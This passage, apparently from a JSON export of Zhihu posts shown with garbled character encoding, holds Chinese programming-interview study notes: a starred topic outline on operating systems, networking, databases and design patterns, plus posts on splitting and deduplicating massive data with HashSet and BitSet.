ç‚¹è¯´æ˜ï¼š</p><ul><li>åˆ†å¸ƒå¼ä¸ç³»ç»Ÿè®¾è®¡éƒ¨åˆ†å¯¹äºå¤§å‚é¢è¯•æ¥è¯´è‡³å…³é‡è¦ï¼Œä½†æ˜¯å°å‚é¢è¯•è€ƒå¯Ÿçš„ä¼šå°‘ä¸€ç‚¹ã€‚</li><li>è¯­è¨€åŸºç¡€éƒ¨åˆ†ï¼Œé˜¿é‡Œå–œæ¬¢é—® Javaã€è…¾è®¯å–œæ¬¢é—® C++ï¼Œå…¶å®ƒå¤§å‚é¢è¯•è€ƒå¯Ÿä¼šå°‘ä¸€äº›ï¼Œå°å‚é¢è¯•ä¼šè€ƒå¯Ÿå¤šä¸€äº›ã€‚</li><li>æ•°æ®åº“ã€ä¸­é—´ä»¶å’Œæ¡†æ¶éƒ¨åˆ†å¯¹äºå¤§å‚é¢è¯•æ¥è¯´ä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Œä½†æ˜¯å¯¹äºå°å‚é¢è¯•ä¼šé‡è¦ä¸€äº›ã€‚</li></ul><p>æœ€åå†è¯´ä¸€ä¸‹é¡¹ç›®éƒ¨åˆ†ï¼Œå®ƒåœ¨å®ä¹ æ‹›è˜é˜¶æ®µä¸­ä¸æ˜¯ç‰¹åˆ«é‡è¦ï¼Œä½†æ˜¯åœ¨æ ¡å›­æ‹›è˜é˜¶æ®µé‡è¦ç¨‹åº¦ä¼šå¢é«˜ã€‚ä½†æ˜¯å¦‚æœä½ çš„å­¦å†ä¸å¥½ï¼Œè€Œä¸”æ²¡æœ‰åšå®¢ã€å¼€æºé¡¹ç›®ã€ç«èµ›ç­‰åŠ åˆ†é¡¹ï¼Œé‚£ä¹ˆæœ€å¥½åšä¸ªæ¯”è¾ƒå‡ºè‰²çš„é¡¹ç›®æ¥å¢åŠ ç®€å†é€šè¿‡ç‡ã€‚</p><p><br/>ğŸ’» </p><h2>2. æ“ä½œç³»ç»Ÿ</h2><h2>2.1 åŸºç¡€</h2><ul><li>â˜…â˜…â˜…  è¿›ç¨‹ä¸çº¿ç¨‹çš„æœ¬è´¨åŒºåˆ«ã€ä»¥åŠå„è‡ªçš„ä½¿ç”¨åœºæ™¯ã€‚</li><li>â˜…â˜†â˜† è¿›ç¨‹çŠ¶æ€ã€‚</li><li>â˜…â˜…â˜… è¿›ç¨‹è°ƒåº¦ç®—æ³•çš„ç‰¹ç‚¹ä»¥åŠä½¿ç”¨åœºæ™¯ã€‚</li><li>â˜…â˜†â˜† çº¿ç¨‹å®ç°çš„æ–¹å¼ã€‚</li><li>â˜…â˜…â˜† åç¨‹çš„ä½œç”¨ã€‚</li><li>â˜…â˜…â˜† å¸¸è§è¿›ç¨‹åŒæ­¥é—®é¢˜ã€‚</li><li>â˜…â˜…â˜… è¿›ç¨‹é€šä¿¡æ–¹æ³•çš„ç‰¹ç‚¹ä»¥åŠä½¿ç”¨åœºæ™¯ã€‚</li><li>â˜…â˜…â˜… æ­»é”å¿…è¦æ¡ä»¶ã€è§£å†³æ­»é”ç­–ç•¥ï¼Œèƒ½å†™å‡ºå’Œåˆ†ææ­»é”çš„ä»£ç ï¼Œèƒ½è¯´æ˜åœ¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæˆ–è€… Java ä¸­å¦‚ä½•è§£å†³æ­»é”ã€‚</li><li>â˜…â˜…â˜… è™šæ‹Ÿå†…å­˜çš„ä½œç”¨ï¼Œåˆ†é¡µç³»ç»Ÿå®ç°è™šæ‹Ÿå†…å­˜åŸç†ã€‚</li><li>â˜…â˜…â˜… é¡µé¢ç½®æ¢ç®—æ³•çš„åŸç†ï¼Œç‰¹åˆ«æ˜¯ LRU çš„å®ç°åŸç†ï¼Œæœ€å¥½èƒ½æ‰‹å†™ï¼Œå†è¯´æ˜å®ƒåœ¨ Redis ç­‰ä½œä¸ºç¼“å­˜ç½®æ¢ç®—æ³•ã€‚</li><li>â˜…â˜…â˜… æ¯”è¾ƒåˆ†é¡µä¸åˆ†æ®µçš„åŒºåˆ«ã€‚</li><li>â˜…â˜…â˜… åˆ†æé™æ€é“¾æ¥çš„ä¸è¶³ï¼Œä»¥åŠåŠ¨æ€é“¾æ¥çš„ç‰¹ç‚¹ã€‚</li></ul><h2>2.2 Linux</h2><ul><li>â˜…â˜…â˜† æ–‡ä»¶ç³»ç»Ÿçš„åŸç†ï¼Œç‰¹åˆ«æ˜¯ inode å’Œ blockã€‚æ•°æ®æ¢å¤åŸç†ã€‚</li><li>â˜…â˜…â˜… ç¡¬é“¾æ¥ä¸è½¯é“¾æ¥çš„åŒºåˆ«ã€‚</li><li>â˜…â˜…â˜† èƒ½å¤Ÿä½¿ç”¨å¸¸ç”¨çš„å‘½ä»¤ï¼Œæ¯”å¦‚ cat æ–‡ä»¶å†…å®¹æŸ¥çœ‹ã€find æœç´¢æ–‡ä»¶ï¼Œä»¥åŠ cutã€sort ç­‰ç®¡çº¿å‘½ä»¤ã€‚äº†è§£ grep å’Œ awk çš„ä½œç”¨ã€‚</li><li>â˜…â˜…â˜… åƒµå°¸è¿›ç¨‹ä¸å­¤å„¿è¿›ç¨‹çš„åŒºåˆ«ï¼Œä» SIGCHLD åˆ†æäº§ç”Ÿåƒµå°¸è¿›ç¨‹çš„åŸå› ã€‚</li></ul><p><br/>â˜ï¸ </p><h2>3. ç½‘ç»œ</h2><h2>3.1 åŸºç¡€</h2><ul><li>â˜…â˜…â˜… å„å±‚åè®®çš„ä½œç”¨ï¼Œä»¥åŠ TCP/IP åè®®çš„ç‰¹ç‚¹ã€‚</li><li>â˜…â˜…â˜† ä»¥å¤ªç½‘çš„ç‰¹ç‚¹ï¼Œä»¥åŠå¸§ç»“æ„ã€‚</li><li>â˜…â˜…â˜† é›†çº¿å™¨ã€äº¤æ¢æœºã€è·¯ç”±å™¨çš„ä½œç”¨ï¼Œä»¥åŠæ‰€å±çš„ç½‘ç»œå±‚ã€‚</li><li>â˜…â˜…â˜† IP æ•°æ®æ•°æ®æŠ¥å¸¸è§å­—æ®µçš„ä½œç”¨ã€‚</li><li>â˜…â˜†â˜† ARP åè®®çš„ä½œç”¨ï¼Œä»¥åŠç»´æŠ¤ ARP ç¼“å­˜çš„è¿‡ç¨‹ã€‚</li><li>â˜…â˜…â˜† ICMP æŠ¥æ–‡ç§ç±»ä»¥åŠä½œç”¨ï¼›å’Œ IP æ•°æ®æŠ¥çš„å…³ç³»ï¼›Ping å’Œ Traceroute çš„å…·ä½“åŸç†ã€‚</li><li>â˜…â˜…â˜… UDP ä¸ TCP æ¯”è¾ƒï¼Œåˆ†æä¸Šå±‚åè®®åº”è¯¥ä½¿ç”¨ UDP è¿˜æ˜¯ TCPã€‚</li><li>â˜…â˜…â˜… ç†è§£ä¸‰æ¬¡æ¡æ‰‹ä»¥åŠå››æ¬¡æŒ¥æ‰‹å…·ä½“è¿‡ç¨‹ï¼Œä¸‰æ¬¡æ¡æ‰‹çš„åŸå› ã€å››æ¬¡æŒ¥æ‰‹åŸå› ã€TIME_WAIT çš„ä½œç”¨ã€‚</li><li>â˜…â˜…â˜… å¯é ä¼ è¾“åŸç†ï¼Œå¹¶è®¾è®¡å¯é  UDP åè®®ã€‚</li><li>â˜…â˜…â˜† TCP æ‹¥å¡æ§åˆ¶çš„ä½œç”¨ï¼Œç†è§£å…·ä½“åŸç†ã€‚</li><li>â˜…â˜…â˜† DNS çš„ç«¯å£å·ï¼›TCP è¿˜æ˜¯ UDPï¼›ä½œä¸ºç¼“å­˜ã€è´Ÿè½½å‡è¡¡ã€‚</li></ul><h2>3.2 HTTP</h2><ul><li>â˜…â˜…â˜… GET ä¸ POST æ¯”è¾ƒï¼šä½œç”¨ã€å‚æ•°ã€å®‰å…¨æ€§ã€å¹‚ç­‰æ€§ã€å¯ç¼“å­˜ã€‚</li><li>â˜…â˜…â˜† HTTP çŠ¶æ€ç ã€‚</li><li>â˜…â˜…â˜… Cookie ä½œç”¨ã€å®‰å…¨æ€§é—®é¢˜ã€å’Œ Session çš„æ¯”è¾ƒã€‚</li><li>â˜…â˜…â˜† ç¼“å­˜ çš„Cache-Control å­—æ®µï¼Œç‰¹åˆ«æ˜¯ Expires å’Œ max-age çš„åŒºåˆ«ã€‚ETag éªŒè¯åŸç†ã€‚</li><li>â˜…â˜…â˜… é•¿è¿æ¥ä¸çŸ­è¿æ¥åŸç†ä»¥åŠä½¿ç”¨åœºæ™¯ï¼Œæµæ°´çº¿ã€‚</li><li>â˜…â˜…â˜… HTTP å­˜åœ¨çš„å®‰å…¨æ€§é—®é¢˜ï¼Œä»¥åŠ HTTPs çš„åŠ å¯†ã€è®¤è¯å’Œå®Œæ•´æ€§ä¿æŠ¤ä½œç”¨ã€‚</li><li>â˜…â˜…â˜† HTTP/1.x çš„ç¼ºé™·ï¼Œä»¥åŠ HTTP/2 çš„ç‰¹ç‚¹ã€‚</li><li>â˜…â˜…â˜… HTTP/1.1 çš„ç‰¹æ€§ã€‚</li><li>â˜…â˜…â˜† HTTP ä¸ FTP çš„æ¯”è¾ƒã€‚</li></ul><h2>3.3 Socket</h2><ul><li>â˜…â˜…â˜† äº”ç§ IO æ¨¡å‹çš„ç‰¹ç‚¹ä»¥åŠæ¯”è¾ƒã€‚</li><li>â˜…â˜…â˜… selectã€pollã€epoll çš„åŸç†ã€æ¯”è¾ƒã€ä»¥åŠä½¿ç”¨åœºæ™¯ï¼›epoll çš„æ°´å¹³è§¦å‘ä¸è¾¹ç¼˜è§¦å‘ã€‚</li></ul><p><br/>ğŸ’¾ </p><h2>4. æ•°æ®åº“</h2><h2>4.1 SQL</h2><ul><li>â˜…â˜…â˜† æ‰‹å†™ SQL è¯­å¥ï¼Œç‰¹åˆ«æ˜¯è¿æ¥æŸ¥è¯¢ä¸åˆ†ç»„æŸ¥è¯¢ã€‚</li><li>â˜…â˜…â˜† è¿æ¥æŸ¥è¯¢ä¸å­æŸ¥è¯¢çš„æ¯”è¾ƒã€‚</li><li>â˜…â˜…â˜† dropã€deleteã€truncate æ¯”è¾ƒã€‚</li><li>â˜…â˜…â˜† è§†å›¾çš„ä½œç”¨ï¼Œä»¥åŠä½•æ—¶èƒ½æ›´æ–°è§†å›¾ã€‚</li><li>â˜…â˜†â˜† ç†è§£å­˜å‚¨è¿‡ç¨‹ã€è§¦å‘å™¨ç­‰ä½œç”¨ã€‚</li></ul><h2>4.2 ç³»ç»ŸåŸç†</h2><ul><li>â˜…â˜…â˜… ACID çš„ä½œç”¨ä»¥åŠå®ç°åŸç†ã€‚</li><li>â˜…â˜…â˜… å››å¤§éš”ç¦»çº§åˆ«ï¼Œä»¥åŠä¸å¯é‡å¤è¯»å’Œå¹»å½±è¯»çš„å‡ºç°åŸå› ã€‚</li><li>â˜…â˜…â˜† å°é”çš„ç±»å‹ä»¥åŠç²’åº¦ï¼Œä¸¤æ®µé”åè®®ï¼Œéšå¼å’Œæ˜¾ç¤ºé”å®šã€‚</li><li>â˜…â˜…â˜… ä¹è§‚é”ä¸æ‚²è§‚é”ã€‚</li><li>â˜…â˜…â˜… MVCC åŸç†ï¼Œå½“å‰è¯»ä»¥åŠå¿«ç…§è¯»ï¼ŒNext-Key Locks è§£å†³å¹»å½±è¯»ã€‚</li><li>â˜…â˜…â˜† èŒƒå¼ç†è®ºã€‚</li><li>â˜…â˜…â˜… SQL ä¸ NoSQL çš„æ¯”è¾ƒã€‚</li></ul><h2>4.3 MySQL</h2><ul><li>â˜…â˜…â˜… B+ Tree åŸç†ï¼Œä¸å…¶å®ƒæŸ¥æ‰¾æ ‘çš„æ¯”è¾ƒã€‚</li><li>â˜…â˜…â˜… MySQL ç´¢å¼•ä»¥åŠä¼˜åŒ–ã€‚</li><li>â˜…â˜…â˜… æŸ¥è¯¢ä¼˜åŒ–ã€‚</li><li>â˜…â˜…â˜… InnoDB ä¸ MyISAM æ¯”è¾ƒã€‚</li><li>â˜…â˜…â˜† æ°´å¹³åˆ‡åˆ†ä¸å‚ç›´åˆ‡åˆ†ã€‚</li><li>â˜…â˜…â˜† ä¸»ä»å¤åˆ¶åŸç†ã€ä½œç”¨ã€å®ç°ã€‚</li><li>â˜…â˜†â˜† redoã€undoã€binlog æ—¥å¿—çš„ä½œç”¨ã€‚</li></ul><h2>4.4 Redis</h2><ul><li>â˜…â˜…â˜† å­—å…¸å’Œè·³è·ƒè¡¨åŸç†åˆ†æã€‚</li><li>â˜…â˜…â˜… ä½¿ç”¨åœºæ™¯ã€‚</li><li>â˜…â˜…â˜… ä¸ Memchached çš„æ¯”è¾ƒã€‚</li><li>â˜…â˜†â˜† æ•°æ®æ·˜æ±°æœºåˆ¶ã€‚</li><li>â˜…â˜…â˜† RDB å’Œ AOF æŒä¹…åŒ–æœºåˆ¶ã€‚</li><li>â˜…â˜…â˜† äº‹ä»¶é©±åŠ¨æ¨¡å‹ã€‚</li><li>â˜…â˜†â˜† ä¸»ä»å¤åˆ¶åŸç†ã€‚</li><li>â˜…â˜…â˜… é›†ç¾¤ä¸åˆ†å¸ƒå¼ã€‚</li><li>â˜…â˜…â˜† äº‹åŠ¡åŸç†ã€‚</li><li>â˜…â˜…â˜… çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</li></ul><p><br/>ğŸ¨ </p><h2>5. é¢å‘å¯¹è±¡</h2><h2>5.1 æ€æƒ³</h2><ul><li>â˜…â˜…â˜…  é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§</li><li>â˜…â˜†â˜† è®¾è®¡åŸåˆ™</li></ul><h2>5.2 è®¾è®¡æ¨¡å¼</h2><ul><li>â˜…â˜…â˜† è®¾è®¡æ¨¡å¼çš„ä½œç”¨ã€‚</li><li>â˜…â˜…â˜… æ‰‹å†™å•ä¾‹æ¨¡å¼ï¼Œç‰¹åˆ«æ˜¯åŒé‡æ£€éªŒé”ä»¥åŠé™æ€å†…éƒ¨ç±»ã€‚</li><li>â˜…â˜…â˜… æ‰‹å†™å·¥å‚æ¨¡å¼ã€‚</li><li>â˜…â˜…â˜… ç†è§£ MVCï¼Œç»“åˆ SpringMVC å›ç­”ã€‚</li><li>â˜…â˜…â˜… ç†è§£ä»£ç†æ¨¡å¼ï¼Œç»“åˆ Spring ä¸­çš„ AOP å›ç­”ã€‚</li><li>â˜…â˜…â˜… åˆ†æ JDK ä¸­å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ï¼Œä¾‹å¦‚è£…é¥°è€…æ¨¡å¼ã€é€‚é…å™¨æ¨¡å¼ã€è¿­ä»£å™¨æ¨¡å¼ç­‰ã€‚</li></ul>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": [
                {
                    "userName": "19205", 
                    "userLink": "https://www.zhihu.com/people/1d217c80a62619084cc89f6c7e1735cd", 
                    "content": "éå¸¸æ„Ÿè°¢", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "å‡Œæ‚ ç„¶", 
                    "userLink": "https://www.zhihu.com/people/5720e70aa75615e3fb66afeff870c51d", 
                    "content": "<p>å¥½ä¸“ä¸š</p><p></p>", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/56655630", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "æµ·é‡æ•°æ®å¤„ç†æ€è·¯", 
            "content": "<h2>1. è®¡ç®—å®¹é‡</h2><p>åœ¨è§£å†³é—®é¢˜ä¹‹å‰ï¼Œè¦å…ˆè®¡ç®—ä¸€ä¸‹æµ·é‡æ•°æ®éœ€è¦å å¤šå¤§çš„å®¹é‡ã€‚å¸¸è§çš„å•ä½æ¢ç®—å¦‚ä¸‹ï¼š</p><ul><li>1 byte = 8 bit</li><li>1 KB = 210 byte = 1024 byte â‰ˆ 103 byte</li><li>1 MB = 220 byte â‰ˆ 10 6 byte</li><li>1 GB = 230 byte â‰ˆ 10 9 byte</li><li>1 äº¿ = 108</li></ul><p>1 ä¸ªæ•´æ•°å  4 byteï¼Œ1 äº¿ä¸ªæ•´æ•°å  4*108 byte â‰ˆ 400 MBã€‚</p><h2>2. æ‹†åˆ†</h2><p>å¯ä»¥å°†æµ·é‡æ•°æ®æ‹†åˆ†åˆ°å¤šå°æœºå™¨ä¸Šå’Œæ‹†åˆ†åˆ°å¤šä¸ªæ–‡ä»¶ä¸Šï¼š</p><ul><li>å¦‚æœæ•°æ®é‡å¾ˆå¤§ï¼Œæ— æ³•æ”¾åœ¨ä¸€å°æœºå™¨ä¸Šï¼Œå°±å°†æ•°æ®æ‹†åˆ†åˆ°å¤šå°æœºå™¨ä¸Šã€‚è¿™ç§æ–¹å¼å¯ä»¥è®©å¤šå°æœºå™¨ä¸€èµ·åˆä½œï¼Œä»è€Œä½¿å¾—é—®é¢˜çš„æ±‚è§£æ›´åŠ å¿«é€Ÿã€‚ä½†æ˜¯ä¹Ÿä¼šå¯¼è‡´ç³»ç»Ÿæ›´åŠ å¤æ‚ï¼Œè€Œä¸”éœ€è¦è€ƒè™‘ç³»ç»Ÿæ•…éšœç­‰é—®é¢˜ï¼›</li><li>å¦‚æœåœ¨ç¨‹åºè¿è¡Œæ—¶æ— æ³•ç›´æ¥åŠ è½½ä¸€ä¸ªå¤§æ–‡ä»¶åˆ°å†…å­˜ä¸­ï¼Œå°±å°†å¤§æ–‡ä»¶æ‹†åˆ†æˆå°æ–‡ä»¶ï¼Œåˆ†åˆ«å¯¹æ¯ä¸ªå°æ–‡ä»¶è¿›è¡Œæ±‚è§£ã€‚</li></ul><p>æœ‰ä»¥ä¸‹ç­–ç•¥è¿›è¡Œæ‹†åˆ†ï¼š</p><ul><li>æŒ‰å‡ºç°çš„é¡ºåºæ‹†åˆ†ï¼šå½“æœ‰æ–°æ•°æ®åˆ°è¾¾æ—¶ï¼Œå…ˆæ”¾è¿›å½“å‰æœºå™¨ï¼Œå¡«æ»¡ä¹‹åå†å°†æ•°æ®æ”¾åˆ°æ–°å¢çš„æœºå™¨ä¸Šã€‚è¿™ç§æ–¹æ³•çš„ä¼˜ç‚¹æ˜¯å……åˆ†åˆ©ç”¨ç³»ç»Ÿçš„èµ„æºï¼Œå› ä¸ºæ¯å°æœºå™¨éƒ½ä¼šå°½å¯èƒ½è¢«å¡«æ»¡ã€‚ç¼ºç‚¹æ˜¯éœ€è¦ä¸€ä¸ªæŸ¥æ‰¾è¡¨æ¥ä¿å­˜æ•°æ®åˆ°æœºå™¨çš„æ˜ å°„ï¼ŒæŸ¥æ‰¾è¡¨å¯èƒ½ä¼šéå¸¸å¤æ‚å¹¶ä¸”éå¸¸å¤§ã€‚</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-35181f347a8ed9b55dfd35a640da3045_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"819\" data-rawheight=\"321\" class=\"origin_image zh-lightbox-thumb\" width=\"819\" data-original=\"https://pic2.zhimg.com/v2-35181f347a8ed9b55dfd35a640da3045_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;819&#39; height=&#39;321&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"819\" data-rawheight=\"321\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"819\" data-original=\"https://pic2.zhimg.com/v2-35181f347a8ed9b55dfd35a640da3045_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-35181f347a8ed9b55dfd35a640da3045_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>æŒ‰æ•£åˆ—å€¼æ‹†åˆ†ï¼šé€‰å–æ•°æ®çš„ä¸»é”® keyï¼Œç„¶åé€šè¿‡å“ˆå¸Œå–æ¨¡ hash(key)%N å¾—åˆ°è¯¥æ•°æ®åº”è¯¥æ‹†åˆ†åˆ°çš„æœºå™¨ç¼–å·ï¼Œå…¶ä¸­ N æ˜¯æœºå™¨çš„æ•°é‡ã€‚ä¼˜ç‚¹æ˜¯ä¸éœ€è¦ä½¿ç”¨æŸ¥æ‰¾è¡¨ï¼Œç¼ºç‚¹æ˜¯å¯èƒ½ä¼šå¯¼è‡´ä¸€å°æœºå™¨å­˜å‚¨çš„æ•°æ®è¿‡å¤šï¼Œç”šè‡³è¶…å‡ºå®ƒçš„æœ€å¤§å®¹é‡ã€‚</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-3b09df5a675ef78513fbbf1e5292033b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"519\" data-rawheight=\"448\" class=\"origin_image zh-lightbox-thumb\" width=\"519\" data-original=\"https://pic4.zhimg.com/v2-3b09df5a675ef78513fbbf1e5292033b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;519&#39; height=&#39;448&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"519\" data-rawheight=\"448\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"519\" data-original=\"https://pic4.zhimg.com/v2-3b09df5a675ef78513fbbf1e5292033b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-3b09df5a675ef78513fbbf1e5292033b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>æŒ‰æ•°æ®çš„å®é™…å«ä¹‰æ‹†åˆ†ï¼šä¾‹å¦‚ä¸€ä¸ªç¤¾äº¤ç½‘ç«™ç³»ç»Ÿï¼Œæ¥è‡ªåŒä¸€ä¸ªåœ°åŒºçš„ç”¨æˆ·æ›´æœ‰å¯èƒ½æˆä¸ºæœ‹å‹ï¼Œå¦‚æœè®©åŒä¸€ä¸ªåœ°åŒºçš„ç”¨æˆ·å°½å¯èƒ½å­˜å‚¨åœ¨åŒä¸€ä¸ªæœºå™¨ä¸Šï¼Œé‚£ä¹ˆåœ¨æŸ¥æ‰¾ä¸€ä¸ªç”¨æˆ·çš„å¥½å‹ä¿¡æ¯æ—¶ï¼Œå°±å¯ä»¥é¿å…åˆ°å¤šå°æœºå™¨ä¸ŠæŸ¥æ‰¾ï¼Œä»è€Œé™ä½å»¶è¿Ÿã€‚ç¼ºç‚¹åŒæ ·æ˜¯éœ€è¦ä½¿ç”¨æŸ¥æ‰¾è¡¨ã€‚</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-5088180544134f6c279f18956ebbf9f5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"838\" data-rawheight=\"314\" class=\"origin_image zh-lightbox-thumb\" width=\"838\" data-original=\"https://pic2.zhimg.com/v2-5088180544134f6c279f18956ebbf9f5_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;838&#39; height=&#39;314&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"838\" data-rawheight=\"314\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"838\" data-original=\"https://pic2.zhimg.com/v2-5088180544134f6c279f18956ebbf9f5_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-5088180544134f6c279f18956ebbf9f5_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>3. æ•´åˆ</h2><p>æ‹†åˆ†ä¹‹åçš„ç»“æœè¿˜åªæ˜¯å±€éƒ¨ç»“æœï¼Œéœ€è¦å°†å±€éƒ¨ç»“æœæ±‡æ€»ä¸ºæ•´ä½“çš„ç»“æœã€‚</p><h2>å‚è€ƒèµ„æ–™</h2><ul><li>ç¨‹åºå‘˜é¢è¯•é‡‘å…¸</li><li>ç¨‹åºå‘˜ä»£ç é¢è¯•æŒ‡å—</li></ul><p></p>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/56655639", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 1, 
            "title": "æµ·é‡æ•°æ®åˆ¤é‡", 
            "content": "<h2>1. é—®é¢˜æè¿°</h2><p>å¯¹äºæµ·é‡æ•°æ®ï¼Œè¦æ±‚åˆ¤æ–­ä¸€ä¸ªæ•°æ®æ˜¯å¦å·²ç»å­˜åœ¨ã€‚è¿™ä¸ªæ•°æ®å¾ˆæœ‰å¯èƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ URLã€‚</p><h2>2. HashSet</h2><p>æœ€ç›´è§‚çš„æ–¹æ³•æ˜¯ä½¿ç”¨ HashSet å­˜å‚¨ï¼Œé‚£ä¹ˆå°±èƒ½ä»¥ O(1) çš„æ—¶é—´å¤æ‚åº¦åˆ¤æ–­ä¸€ä¸ªæ•°æ®æ˜¯å¦å·²ç»å­˜åœ¨ã€‚</p><p>è€ƒè™‘åˆ°æ•°æ®æ˜¯æµ·é‡çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨æ‹†åˆ†çš„æ–¹å¼å°†æ•°æ®æ‹†åˆ†åˆ°å¤šå°æœºå™¨ä¸Šï¼Œåˆ†åˆ«åœ¨æ¯å°æœºå™¨ä¸Šä½¿ç”¨ HashSet å­˜å‚¨ã€‚æˆ‘ä»¬éœ€è¦ä½¿å¾—ç›¸åŒçš„æ•°æ®æ‹†åˆ†åˆ°ç›¸åŒçš„æœºå™¨ä¸Šï¼Œå¯ä»¥ä½¿ç”¨å“ˆå¸Œå–æ¨¡çš„æ‹†åˆ†æ–¹å¼è¿›è¡Œå®ç°ã€‚</p><h2>3. BitSet</h2><p>å¦‚æœæµ·é‡æ•°æ®æ˜¯æ•´æ•°ï¼Œå¹¶ä¸”èŒƒå›´ä¸å¤§æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨ BitSet å­˜å‚¨ã€‚é€šè¿‡æ„å»ºä¸€å®šå¤§å°çš„æ¯”ç‰¹æ•°ç»„ï¼Œå¹¶ä¸”è®©æ¯ä¸ªæ•´æ•°éƒ½æ˜ å°„åˆ°è¿™ä¸ªæ¯”ç‰¹æ•°ç»„ä¸Šï¼Œå°±å¯ä»¥å¾ˆå®¹æ˜“åœ°çŸ¥é“æŸä¸ªæ•´æ•°æ˜¯å¦å·²ç»å­˜åœ¨ã€‚å› ä¸ºæ¯”ç‰¹æ•°ç»„æ¯”æ•´å‹æ•°ç»„å°çš„å¤šï¼Œæ‰€ä»¥é€šå¸¸æƒ…å†µä¸‹å•æœºå°±èƒ½å¤„ç†æµ·é‡æ•°æ®ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-f005559bd00ef0c295d8a23380811030_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"575\" data-rawheight=\"266\" class=\"origin_image zh-lightbox-thumb\" width=\"575\" data-original=\"https://pic1.zhimg.com/v2-f005559bd00ef0c295d8a23380811030_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;575&#39; height=&#39;266&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"575\" data-rawheight=\"266\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"575\" data-original=\"https://pic1.zhimg.com/v2-f005559bd00ef0c295d8a23380811030_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-f005559bd00ef0c295d8a23380811030_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ª BitSet çš„å®ç°ï¼Œå½“ç„¶åœ¨å®é™…å¼€å‘ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨è¯­è¨€å†…ç½®çš„å®ç°ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">class</span> <span class=\"nc\">BitSet</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">bitset</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">BitSet</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">size</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">bitset</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[(</span><span class=\"n\">size</span> <span class=\"o\">&gt;&gt;</span> <span class=\"n\">5</span><span class=\"o\">)</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span> <span class=\"c1\">// divide by 32\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n\n    <span class=\"kt\">boolean</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">pos</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">wordNumber</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">pos</span> <span class=\"o\">&gt;&gt;</span> <span class=\"n\">5</span><span class=\"o\">);</span> <span class=\"c1\">// divide by 32\n</span><span 